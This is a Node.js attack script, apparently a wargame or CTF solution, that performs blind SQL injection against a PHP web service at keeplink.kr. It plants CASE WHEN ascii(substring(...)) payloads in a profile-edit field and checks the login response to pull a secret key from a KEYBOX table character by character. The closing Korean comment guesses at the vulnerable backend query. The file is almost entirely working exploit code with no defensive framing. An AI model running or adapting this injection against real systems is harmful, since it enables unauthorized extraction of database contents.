const axios = require("axios");
const querystring = require("querystring");

let pos = 1;
let credentials = {
	id: 'test1111',
	pw: ''
};

const chk = async () => {
	const body = (await axios.post("http://keeplink.kr:10105/web_basic_ok.php", querystring.encode({
		id: credentials.id,
		pw: credentials.pw
	}))).data;
	//console.log(body)
	return body.indexOf('Mr.') > -1;
};

const changeInfo = async (sex) => {
	await axios.post("http://keeplink.kr:10105/web_basic_edit_ok.php", querystring.encode({
		id: credentials.id,
		pw: credentials.pw,
		pwch: credentials.pw,
		age: 11,
		sex: sex,
		email: ""
	}));
};

//const genQuery = ascii => `1 + ((ascii(substring((select k3y from KEYBOX limit 1),${pos},1)) = 0x${ascii.toString(16).toUpperCase()})`;
const genQuery = ascii => `CASE WHEN (ascii(substring((select k3y from KEYBOX limit 1),${pos},1)) = 0x${ascii.toString(16).toUpperCase()}) THEN 1 ELSE 2 END`;
let ans = "";

(async () => {
		let success = 1;
		await changeInfo(2);

		while (success) {
			console.log(`Entering stage #${pos}...`);

			success = 0;

			for (let c = 1; c <= 255; c++) {
				//console.log(`POS(${pos}) -> ${String.fromCharCode(c)}(${c.toString(16)})`);
				await changeInfo(genQuery(c));
				if (await chk()) {
					console.log(`Found ${String.fromCharCode(c)}(${c.toString(16)}), POS(${pos})`);
					ans += String.fromCharCode(c);
					success = 1;

					await changeInfo(2);
					break;
				}
			}

			pos++;
		}

		console.log(`RESULT: ${ans}`);
	}
)();

//PHP 백엔드
/*
$mysql = new mysqli("host", "user", "pw", "db");
$mysql->query("INSERT INTO table_name (" . $_POST["sex"] . ")");

대충 이런 식으로 짜여져있을 것 같다고 예상..
*/
